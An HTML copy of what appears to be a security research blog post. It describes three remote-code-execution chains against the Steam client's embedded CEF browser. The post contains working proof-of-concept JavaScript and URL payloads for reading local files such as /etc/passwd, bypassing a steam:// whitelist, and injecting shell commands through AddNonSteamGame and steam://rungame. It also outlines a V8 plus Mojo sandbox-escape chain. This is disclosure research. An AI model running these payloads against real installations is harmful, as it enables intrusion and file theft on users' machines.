<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Exploiting Steam: Usual and Unusual Ways in the CEF Framework | DARKNAVY</title><meta name=keywords content><meta name=description content="Introduction
The Chromium Embedded Framework (CEF) is an open-source framework that allows developers to embed the Chromium engine in their applications. Although CEF is widely employed in a range of popular software, including WeChat and the Epic Games Launcher, there has been little security research on it. In this article, we will use the Steam Client Browser (a CEF-based application) as an example to present the vulnerabilities we found and how we exploited them to build three Remote Code Execution (RCE) chains."><meta name=author content="DARKNAVY"><link rel=canonical href=https://www.darknavy.org/blog/exploiting_steam_usual_and_unusual_ways_in_the_cef_framework/><link crossorigin=anonymous href=/assets/css/stylesheet.2613b1460fae4b99a98c033e33bde5e6a3af84ddb20236b732cefe33e3c0781e.css integrity="sha256-JhOxRg+uS5mpjAM+M73l5qOvhN2yAja3Ms7+M+PAeB4=" rel="preload stylesheet" as=style><link rel=icon href=https://www.darknavy.org/images/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://www.darknavy.org/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://www.darknavy.org/favicon-32x32.png><link rel=apple-touch-icon href=https://www.darknavy.org/apple-touch-icon.png><link rel=mask-icon href=https://www.darknavy.org/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://www.darknavy.org/blog/exploiting_steam_usual_and_unusual_ways_in_the_cef_framework/><link rel=alternate hreflang=zh href=https://www.darknavy.org/zh/blog/exploiting_steam_usual_and_unusual_ways_in_the_cef_framework/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-LR4ZN1LSPS"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-LR4ZN1LSPS")}</script><meta property="og:url" content="https://www.darknavy.org/blog/exploiting_steam_usual_and_unusual_ways_in_the_cef_framework/"><meta property="og:site_name" content="DARKNAVY"><meta property="og:title" content="Exploiting Steam: Usual and Unusual Ways in the CEF Framework"><meta property="og:description" content="Introduction The Chromium Embedded Framework (CEF) is an open-source framework that allows developers to embed the Chromium engine in their applications. Although CEF is widely employed in a range of popular software, including WeChat and the Epic Games Launcher, there has been little security research on it. In this article, we will use the Steam Client Browser (a CEF-based application) as an example to present the vulnerabilities we found and how we exploited them to build three Remote Code Execution (RCE) chains."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="blog"><meta property="article:published_time" content="2024-06-27T11:39:32+08:00"><meta property="article:modified_time" content="2024-06-27T11:39:32+08:00"><meta property="og:image" content="https://www.darknavy.org/images/white_logo.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://www.darknavy.org/images/white_logo.png"><meta name=twitter:title content="Exploiting Steam: Usual and Unusual Ways in the CEF Framework"><meta name=twitter:description content="Introduction
The Chromium Embedded Framework (CEF) is an open-source framework that allows developers to embed the Chromium engine in their applications. Although CEF is widely employed in a range of popular software, including WeChat and the Epic Games Launcher, there has been little security research on it. In this article, we will use the Steam Client Browser (a CEF-based application) as an example to present the vulnerabilities we found and how we exploited them to build three Remote Code Execution (RCE) chains."><meta name=twitter:site content="@DarkNavyOrg"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blog","item":"https://www.darknavy.org/blog/"},{"@type":"ListItem","position":2,"name":"Exploiting Steam: Usual and Unusual Ways in the CEF Framework","item":"https://www.darknavy.org/blog/exploiting_steam_usual_and_unusual_ways_in_the_cef_framework/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Exploiting Steam: Usual and Unusual Ways in the CEF Framework","name":"Exploiting Steam: Usual and Unusual Ways in the CEF Framework","description":"Introduction The Chromium Embedded Framework (CEF) is an open-source framework that allows developers to embed the Chromium engine in their applications. Although CEF is widely employed in a range of popular software, including WeChat and the Epic Games Launcher, there has been little security research on it. In this article, we will use the Steam Client Browser (a CEF-based application) as an example to present the vulnerabilities we found and how we exploited them to build three Remote Code Execution (RCE) chains.\n","keywords":[],"articleBody":"Introduction The Chromium Embedded Framework (CEF) is an open-source framework that allows developers to embed the Chromium engine in their applications. Although CEF is widely employed in a range of popular software, including WeChat and the Epic Games Launcher, there has been little security research on it. In this article, we will use the Steam Client Browser (a CEF-based application) as an example to present the vulnerabilities we found and how we exploited them to build three Remote Code Execution (RCE) chains.\nRCE#1: Multiple Issues in steamwebhelper Leading to RCE steamwebhelper is a built-in browser within the Steam client, used for rendering pages such as the store, community, and friends. It is developed based on CEF and has added some features on top of CEF. We have found a series of logical vulnerabilities and issues caused by these additional features, eventually leading to RCE.\nObtaining the SteamClient Object in External Pages When steamwebhelper loads certain specific pages, such as steampowered.com and steamloopback.host, it injects a privileged object SteamClient into the JavaScript environment. Upon reverse engineering this process, we discovered that for URLs with a domain name, steamwebhelper calls BIsTrustedDomain to check if the domain is in the whitelist. For URLs without a domain name, it checks whether the domain is a data or about protocol.\nLoading a domain in the whitelist from an external page will be restricted by the same-origin policy, however, loading pages like about:blank will not be. So we can open “about:blank” on our own controllable page, obtain and use its SteamClient.\nPoC:\nab_page = open(\"about:blank\"); s_client = ab_page.SteamClient; alert(s_client); Loading the File Protocol Using BrowserView SteamClient is a privileged object used by internal pages in Steam, which has many privileged functions, such as operating the current Browser object, managing window position, downloading any file and etc.\nThrough SteamClient.BrowserView, we can create and manage BrowserView. Testing revealed that BrowserView is a subpage embedded in the original webpage, similar to an iframe in a normal web page, but interaction with this object is implemented by Steam itself.\nIn testing the functionality of BrowserView, we discovered that calls to BrowserView.LoadURL are not restricted by any security policies and can load URLs with any protocol or domain, including high-privilege protocols like chrome:// and file://.\nPoC:\nb_view = s_client.BrowserView.Create(); b_view.LoadURL(\"file:///etc/passwd\"); b_view.SetBounds(0, 0, 1000, 1000); b_view.SetVisible(true); Accessing the Content of Pages Loaded in BrowserView to Read Arbitrary Files At this point, we can use LoadURL to load any local file, but we still can’t directly read the page content. By testing and reverse engineering the BrowserView object, we found its FindInPage feature can search for specific strings in the page, and by calling BrowserView.on(\"find-in-page-results\", callback), we can register a callback function to process the search results. The question then becomes: if we can search for a controlled string in the page and obtain the search results, can we access the page content? (Sounds like a CTF problem)\nThe answer is affirmative. By brute-forcing byte by byte, we can achieve the effect of reading arbitrary files eventually,.\nPoC（Obtain usernames by reading file:///home/）:\nasync function is_str_in_bv(bv, s, count) { window.stage = 0; bv.FindInPage(s, true, true); while (window.stage \u003c 3) { await sleep(10); } return window.count \u003e count; } b_view.on(\"find-in-page-results\", (a, b) =\u003e { if (window.stage == 0) { if (a == 0 \u0026\u0026 b == 0) { window.stage = 3; window.count = 0; } else window.stage++; } else if (window.stage++ == 2) window.count = a; }); baseuser = \"/\"; charset = \"abcdefghijklmnopqrstuvwxyz\"; while (true) { found = false; for (c of charset) { teststr = c + baseuser; count = 0; if (\"home/\".endsWith(teststr)) count = 1; if (await is_str_in_bv(b_view, teststr, count)) { found = true; break; }; } if (!found) break; baseuser = teststr; } alert(baseuser); From arbitrary file reading to arbitrary file creation In this vulnerability report, it is mentioned that arbitrary file creation (with uncontrollable file content) can be achieved through the list-shortcuts and other functions of steam://devkit-1. The fix for this vulnerability was to generate a random string in the ~/.steam/steam.token file, and to verify this token when using steam://devkit-1 related functions. In fact, this method does not fix the logical flaw in this functionality. If an attacker can read the token, they can easily bypass this fix.\nAt this point, we can use the arbitrary file reading capability to obtain the content of the token, thus using this functionality to create arbitrary files.\nHowever, as ideal as this sounds, when opening a steam:// URL from steamwebhelper, there is a check, and only functions in the whitelist can be directly opened from the built-in browser. devkit-1 is not among them.\nWe found through our research that the steam://openexternalforpid/ in the whitelist will parse its internal URL and load it. By opening steam://openexternalforpid/1/steam://devkit-1/, we can bypass the whitelist check, thereby achieving arbitrary file creation.\nPoC:\nopen(\"steam://openexternalforpid/1/steam://devkit-1/\" + token + \"/list-shortcuts?response=/tmp/hacked\"); From Arbitrary File Creation to RCE Among the many functionalities offered by steam:// URLs, steam://AddNonSteamGame appears quite interesting. As the name suggests, it allows the addition of a user-provided string as a non-Steam game to the Steam game library. The Steam client executes non-Steam games as shell scripts, so we can insert backticks into the string to create a game that executes arbitrary commands. To use this feature, the /tmp/addnonsteamgamefile file needs to be created first. The Steam client checks for the existence of this file and attempts to read the gameid from it. If it reads an invalid gameid, it will generate one randomly, that is to say that the content of the file does not affect the functionality\"\nCoincidentally, our previous ability to create arbitrary files perfectly meets this requirement, allowing us to add any custom game.\nWhile attempting to trigger this, we found that steam://openexternalforpid converts the domain names in the URLs it opens to lowercase. For instance, steam://openexternalforpid/1/steam://AddNonSteamGame/ would be changed to steam://addnonsteamgame/, preventing Steam from correctly recognizing it.\nAfter various attempts, we discovered a workaround, i.e., using an additional layer of steam://open:\nAt this point, we finally can create arbitrary malicious games. However, to run the game, we need to know the gameid of the game, and we do not know this randomly generated 64-bit number. This is not a big problem for us, who already have the ability to read any file. By reading ~/.local/share/Steam/logs/console_log.txt, we can find the App id of the newly created malicious game.\n[2023-11-21 04:11:53] ExecuteSteamURL: \"steam://open/steam://AddNonSteamGame/%60gnome-calculator%60\" [2023-11-21 04:11:53] ExecuteSteamURL: \"steam://AddNonSteamGame/%60gnome-calculator%60\" [2023-11-21 04:11:53] GLibLog: domain:Gtk msg:gtk_disable_setlocale() must be called before gtk_init() [2023-11-21 04:11:53] sanitize shortcut app id \"`gnome-calculator`\": replacing 0 with 3843969204, reason: k_unAppIdInvalid The final gameid can be calculated from the App id found in the log. The gameid equals app_id \u003c\u003c 32 | 0x2000000. Once we know the gameid, we can use steam://rungameid to launch it.\nThe complete exploitation code has been publicly released on our GitHub.\nRCE#2: Command Injection in steam://rungame steam://rungame is a URL scheme function provided by Steam that can be used to start games and specify their command-line arguments. When opened in the Linux client, it executes the following command:\n/bin/sh -c /home/bob/.local/share/Steam/ubuntu12_32/reaper SteamLaunch AppId={appid} -- /home/bob/.local/share/Steam/ubuntu12_32/steam-launch-wrapper -- {gamepath} {argument} Since it is executed by /bin/sh -c, there is a possibility of command injection. We attempted to add `ls` in the command-line arguments, and found it becomes '`ls`'. Due to the backticks being wrapped in single quotes, direct command injection is not possible.\nWe then tried to add single quotes to the command-line arguments to break the pairing of single quotes, but found that the single quotes simply disappeared.\nSo we analyzed steam://rungame logic and performed a simple reverse engineering analysis, finding that its steps are roughly as follows:\nCall V_ParseShellCommandLine, where the single ' are filtered, and \\' is replaced with ' Call V_EscapeShellArgumentAndAppend to wrap the argument with single quotes, and replace ' in the argument with '\\'' Replace \\ with \\\\ Concatenate it into the command string for execution It is apparent that in the third step, all \\ are treated as normal characters. To be processed correctly by /bin/sh, an extra \\ is added as escape character, but the possibility of \\ itself being an escape character was not considered. If we set our input as \\'`gnome-calculator`\\', after the above four steps, it will become: ''\\\\''`gnome-calculator`'\\\\'''. It is evident that replacing \\ with \\\\ disrupts the correct pairing of single quotes, causing `gnome-calculator` to appear outside the single quotes, leading to a command injection issue.\nFinally, to generate a URL that can be correctly processed by steam://rungame, the \\ needs to be URL-encoded. The final PoC:\n\u003ca href=\"steam://rungame/262410/76561202255233023/%5c'`gnome-calculator`%5c'\"\u003ePOPUP gnome-calculator\u003c/a\u003e In this PoC, 262410 is the App id for “World of Guns: Gun Disassembly”, and it can be replaced with any installed game that parses command-line arguments (most games support this).\nRCE#3: Historical Vulnerabilities in Chrome The built-in browser in Steam is developed based on the Chromium Embedded Framework (CEF) version 85.0.4183.121. CEF is a framework used to embed Chromium in applications, synchronized with Chromium’s version number. The Chromium version 85.0.4183.121 was released in September 2020, and since then, numerous historical vulnerabilities have been found, but almost all of them haven’t been patched by Steam.\nWe selected a v8 vulnerability (Issue 1234764) and a sandbox escape vulnerability (Issue 1251727) to achieve RCE.\nThe former is a optimization error of Right Operand Rotating, allowing arbitrary address read and write in the renderer process. The details of exploiting this are thoroughly explained in the attachment of the vulnerability report and will not be reiterated here.\nThe latter is a logical vulnerability. For the kPortal and kFencedframe types of frames created via CreateChildFrame called by Mojo, their state never changes to kCreated. This results in their destructors not calling WebContentsObserver::RenderFrameDeleted to notify objects holding the raw pointer of RenderFrameHostImpl, leading to UAF. This vulnerability is of excellent quality, as both free and use actions can be triggered at any time, and subsequent exploitation can utilize any Mojo interface under RenderFrameHostImpl. However, since the original PoC in the vulnerability report triggers the bug via a source code patch, achieving this effect requires patching the binary to add shellcode for sending Mojo messages.\nIn the actual process of writing the exploit, to reduce workload, we aimed to patch the binary as little as possible, preferring to write the exploit in JavaScript. However, we found that frames of type kPortal could not load HTML document by specifying src, thus, it was not possible to execute JavaScript in these frames. One option was to patch and use the RenderFrameImpl::ExecuteJavaScript function to execute JavaScript. Then, as suggested by Tim Becker in Cleanly Escaping the Chrome Sandbox, we could use a general approach of sending the Mojo handle from the portal frame to the main frame for exploitation.\nHowever, this method still required patching. Here, we propose a new exploitation technique that allows a portal frame, which cannot execute JavaScript, to send Mojo messages without needing a patch, provided there is arbitrary read and write capability in the renderer.\nOur research showed that when sending Mojo messages, the actual routing and handling are managed by the mojo::Remote field internal_state_.proxy_. We could exploit a v8 vulnerability to read the address of the portal’s RenderFrameImpl from g_frame_map and manipulate it to ‘steal’ the proxy_ member and give it to another iframe under our control. This allows us to use the controlled iframe to masquerade as the portal and send Mojo messages using JavaScript.\nThe overall exploitation strategy is as follows:\nUse the v8 vulnerability to enable Mojo JS\nCreate an iframe A and hijack its vtable using the v8 vulnerability, modifying its OwnerType to pretend to be a portal frame\nCreate another iframe B for executing JavaScript later\nUse the v8 vulnerability to read the addresses of RenderFrameImpl for A and B from g_frame_map\nUse the v8 vulnerability to assign A’s proxy_ to B\nUse B to create a Mojo connection\nRemove A, triggering the destruction of RenderFrameHostImpl\nUse B to trigger UAF\nUse Blob for placeholder, control the vtable, and other subsequent exploitations.\n","wordCount":"2000","inLanguage":"en","image":"https://www.darknavy.org/images/white_logo.png","datePublished":"2024-06-27T11:39:32+08:00","dateModified":"2024-06-27T11:39:32+08:00","author":{"@type":"Person","name":"DARKNAVY"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://www.darknavy.org/blog/exploiting_steam_usual_and_unusual_ways_in_the_cef_framework/"},"publisher":{"@type":"Organization","name":"DARKNAVY","logo":{"@type":"ImageObject","url":"https://www.darknavy.org/images/favicon.ico"}}}</script></head><body class=dark id=top><header class=header><nav class=nav><div class=logo><a href=https://www.darknavy.org/ accesskey=h title="  (Alt + H)"><img src=https://www.darknavy.org/images/darknavy_shenlan_dot.png alt aria-label=logo height=20></a><div class=logo-switches><ul class=lang-switch><li>|</li><li><a href=https://www.darknavy.org/zh/ title=Chinese aria-label=Chinese>Zh</a></li></ul></div></div><ul id=menu><li><a href=https://www.darknavy.org/ title=Home><span>Home</span></a></li><li><a href=https://www.darknavy.org/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://www.darknavy.org/darknavy_insight/ title=Insight><span>Insight</span></a></li><li><a href=https://www.darknavy.org/about/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://www.darknavy.org/>Home</a>&nbsp;»&nbsp;<a href=https://www.darknavy.org/blog/>Blog</a></div><h1 class="post-title entry-hint-parent">Exploiting Steam: Usual and Unusual Ways in the CEF Framework</h1><div class=post-meta><span title='2024-06-27 11:39:32 +0800 CST'>June 27, 2024</span>&nbsp;·&nbsp;2000 words&nbsp;·&nbsp;DARKNAVY&nbsp;|&nbsp;Translations:<ul class=i18n_list><li><a href=https://www.darknavy.org/zh/blog/exploiting_steam_usual_and_unusual_ways_in_the_cef_framework/>Zh</a></li></ul></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#rce1-multiple-issues-in-steamwebhelper-leading-to-rce>RCE#1: Multiple Issues in <code>steamwebhelper</code> Leading to RCE</a><ul><li><a href=#obtaining-the-steamclient-object-in-external-pages>Obtaining the <code>SteamClient</code> Object in External Pages</a></li><li><a href=#loading-the-file-protocol-using-browserview>Loading the File Protocol Using <code>BrowserView</code></a></li><li><a href=#accessing-the-content-of-pages-loaded-in-browserview-to-read-arbitrary-files>Accessing the Content of Pages Loaded in <code>BrowserView</code> to Read Arbitrary Files</a></li><li><a href=#from-arbitrary-file-reading-to-arbitrary-file-creation>From arbitrary file reading to arbitrary file creation</a></li><li><a href=#from-arbitrary-file-creation-to-rce>From Arbitrary File Creation to RCE</a></li></ul></li><li><a href=#rce2-command-injection-in-steamrungame>RCE#2: Command Injection in <code>steam://rungame</code></a></li><li><a href=#rce3-historical-vulnerabilities-in-chrome>RCE#3: Historical Vulnerabilities in Chrome</a></li></ul></nav></div></details></div><div class=post-content><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p>The Chromium Embedded Framework (CEF) is an open-source framework that allows developers to embed the Chromium engine in their applications. Although CEF is widely employed in a range of popular software, including WeChat and the Epic Games Launcher, there has been little security research on it. In this article, we will use the Steam Client Browser (a CEF-based application) as an example to present the vulnerabilities we found and how we exploited them to build three Remote Code Execution (RCE) chains.</p><h2 id=rce1-multiple-issues-in-steamwebhelper-leading-to-rce>RCE#1: Multiple Issues in <code>steamwebhelper</code> Leading to RCE<a hidden class=anchor aria-hidden=true href=#rce1-multiple-issues-in-steamwebhelper-leading-to-rce>#</a></h2><p><code>steamwebhelper</code> is a built-in browser within the Steam client, used for rendering pages such as the store, community, and friends. It is developed based on <code>CEF</code> and has added some features on top of <code>CEF</code>. We have found a series of logical vulnerabilities and issues caused by these additional features, eventually leading to RCE.</p><h3 id=obtaining-the-steamclient-object-in-external-pages>Obtaining the <code>SteamClient</code> Object in External Pages<a hidden class=anchor aria-hidden=true href=#obtaining-the-steamclient-object-in-external-pages>#</a></h3><p>When <code>steamwebhelper</code> loads certain specific pages, such as <code>steampowered.com</code> and <code>steamloopback.host</code>, it injects a <strong>privileged object</strong> <code>SteamClient</code> into the JavaScript environment. Upon reverse engineering this process, we discovered that for URLs with a domain name, <code>steamwebhelper</code> calls <code>BIsTrustedDomain</code> to check if the domain is in the whitelist. For URLs without a domain name, it checks whether the domain is a <code>data</code> or <code>about</code> protocol.</p><img src=assets/1.jpg style=display:block;margin-left:auto;margin-right:auto;zoom:50%><p>Loading a domain in the whitelist from an external page will be restricted by the same-origin policy, however, loading pages like <code>about:blank</code> will not be. So we can open &ldquo;about:blank&rdquo; on our own controllable page, obtain and use its <code>SteamClient</code>.</p><p>PoC:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>ab_page</span> <span class=o>=</span> <span class=nx>open</span><span class=p>(</span><span class=s2>&#34;about:blank&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>s_client</span> <span class=o>=</span> <span class=nx>ab_page</span><span class=p>.</span><span class=nx>SteamClient</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>alert</span><span class=p>(</span><span class=nx>s_client</span><span class=p>);</span>
</span></span></code></pre></div><h3 id=loading-the-file-protocol-using-browserview>Loading the File Protocol Using <code>BrowserView</code><a hidden class=anchor aria-hidden=true href=#loading-the-file-protocol-using-browserview>#</a></h3><p><code>SteamClient</code> is a privileged object used by internal pages in Steam, which has many privileged functions, such as operating the current Browser object, managing window position, downloading any file and etc.</p><img src=assets/2.png style=display:block;margin-left:auto;margin-right:auto;zoom:100%><p>Through <code>SteamClient.BrowserView</code>, we can create and manage <code>BrowserView</code>. Testing revealed that <code>BrowserView</code> is a subpage embedded in the original webpage, similar to an iframe in a normal web page, but interaction with this object is implemented by Steam itself.</p><img src=assets/3.png style=display:block;margin-left:auto;margin-right:auto;zoom:100%><p>In testing the functionality of <code>BrowserView</code>, we discovered that calls to <code>BrowserView.LoadURL</code> are not restricted by any security policies and can load URLs with any protocol or domain, including high-privilege protocols like <code>chrome://</code> and <code>file://</code>.</p><p>PoC:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>b_view</span> <span class=o>=</span> <span class=nx>s_client</span><span class=p>.</span><span class=nx>BrowserView</span><span class=p>.</span><span class=nx>Create</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>b_view</span><span class=p>.</span><span class=nx>LoadURL</span><span class=p>(</span><span class=s2>&#34;file:///etc/passwd&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>b_view</span><span class=p>.</span><span class=nx>SetBounds</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1000</span><span class=p>,</span> <span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>b_view</span><span class=p>.</span><span class=nx>SetVisible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span>
</span></span></code></pre></div><h3 id=accessing-the-content-of-pages-loaded-in-browserview-to-read-arbitrary-files>Accessing the Content of Pages Loaded in <code>BrowserView</code> to Read Arbitrary Files<a hidden class=anchor aria-hidden=true href=#accessing-the-content-of-pages-loaded-in-browserview-to-read-arbitrary-files>#</a></h3><p>At this point, we can use <code>LoadURL</code> to load any local file, but we still can&rsquo;t directly read the page content. By testing and reverse engineering the <code>BrowserView</code> object, we found its <code>FindInPage</code> feature can search for specific strings in the page, and by calling <code>BrowserView.on("find-in-page-results", callback)</code>, we can register a callback function to process the search results. The question then becomes: if we can search for a controlled string in the page and obtain the search results, can we access the page content? (Sounds like a CTF problem)</p><p>The answer is affirmative. By brute-forcing byte by byte, we can achieve the effect of reading arbitrary files eventually,.</p><p>PoC（Obtain usernames by reading <code>file:///home/</code>）:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>async</span> <span class=kd>function</span> <span class=nx>is_str_in_bv</span><span class=p>(</span><span class=nx>bv</span><span class=p>,</span> <span class=nx>s</span><span class=p>,</span> <span class=nx>count</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nb>window</span><span class=p>.</span><span class=nx>stage</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nx>bv</span><span class=p>.</span><span class=nx>FindInPage</span><span class=p>(</span><span class=nx>s</span><span class=p>,</span> <span class=kc>true</span><span class=p>,</span> <span class=kc>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>stage</span> <span class=o>&lt;</span> <span class=mi>3</span><span class=p>)</span> <span class=p>{</span> <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>10</span><span class=p>);</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nb>window</span><span class=p>.</span><span class=nx>count</span> <span class=o>&gt;</span> <span class=nx>count</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>b_view</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s2>&#34;find-in-page-results&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>a</span><span class=p>,</span> <span class=nx>b</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>stage</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>a</span> <span class=o>==</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=nx>b</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span> <span class=nb>window</span><span class=p>.</span><span class=nx>stage</span> <span class=o>=</span> <span class=mi>3</span><span class=p>;</span> <span class=nb>window</span><span class=p>.</span><span class=nx>count</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=nb>window</span><span class=p>.</span><span class=nx>stage</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>stage</span><span class=o>++</span> <span class=o>==</span> <span class=mi>2</span><span class=p>)</span> <span class=nb>window</span><span class=p>.</span><span class=nx>count</span> <span class=o>=</span> <span class=nx>a</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl><span class=nx>baseuser</span> <span class=o>=</span> <span class=s2>&#34;/&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>charset</span> <span class=o>=</span> <span class=s2>&#34;abcdefghijklmnopqrstuvwxyz&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=p>(</span><span class=kc>true</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>found</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=nx>c</span> <span class=k>of</span> <span class=nx>charset</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>teststr</span> <span class=o>=</span> <span class=nx>c</span> <span class=o>+</span> <span class=nx>baseuser</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>count</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=s2>&#34;home/&#34;</span><span class=p>.</span><span class=nx>endsWith</span><span class=p>(</span><span class=nx>teststr</span><span class=p>))</span> <span class=nx>count</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=kr>await</span> <span class=nx>is_str_in_bv</span><span class=p>(</span><span class=nx>b_view</span><span class=p>,</span> <span class=nx>teststr</span><span class=p>,</span> <span class=nx>count</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>found</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>found</span><span class=p>)</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nx>baseuser</span> <span class=o>=</span> <span class=nx>teststr</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>alert</span><span class=p>(</span><span class=nx>baseuser</span><span class=p>);</span>
</span></span></code></pre></div><h3 id=from-arbitrary-file-reading-to-arbitrary-file-creation>From arbitrary file reading to arbitrary file creation<a hidden class=anchor aria-hidden=true href=#from-arbitrary-file-reading-to-arbitrary-file-creation>#</a></h3><p>In this <a href=https://hackerone.com/reports/667242>vulnerability report</a>, it is mentioned that arbitrary file creation (with uncontrollable file content) can be achieved through the <code>list-shortcuts</code> and other functions of <code>steam://devkit-1</code>. The fix for this vulnerability was to generate a random string in the <code>~/.steam/steam.token</code> file, and to verify this token when using <code>steam://devkit-1</code> related functions. In fact, this method does not fix the logical flaw in this functionality. If an attacker can read the token, they can easily bypass this fix.</p><p>At this point, we can use the arbitrary file reading capability to obtain the content of the token, thus using this functionality to create arbitrary files.</p><p>However, as ideal as this sounds, when opening a <code>steam://</code> URL from <code>steamwebhelper</code>, there is a check, and only functions in the whitelist can be directly opened from the built-in browser. <code>devkit-1</code> is not among them.</p><img src=assets/4.jpg style=display:block;margin-left:auto;margin-right:auto;zoom:80%><p>We found through our research that the <code>steam://openexternalforpid/</code> in the whitelist will parse its internal URL and load it. By opening <code>steam://openexternalforpid/1/steam://devkit-1/</code>, we can bypass the whitelist check, thereby achieving arbitrary file creation.</p><p>PoC:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>open</span><span class=p>(</span><span class=s2>&#34;steam://openexternalforpid/1/steam://devkit-1/&#34;</span> <span class=o>+</span> <span class=nx>token</span> <span class=o>+</span> <span class=s2>&#34;/list-shortcuts?response=/tmp/hacked&#34;</span><span class=p>);</span>
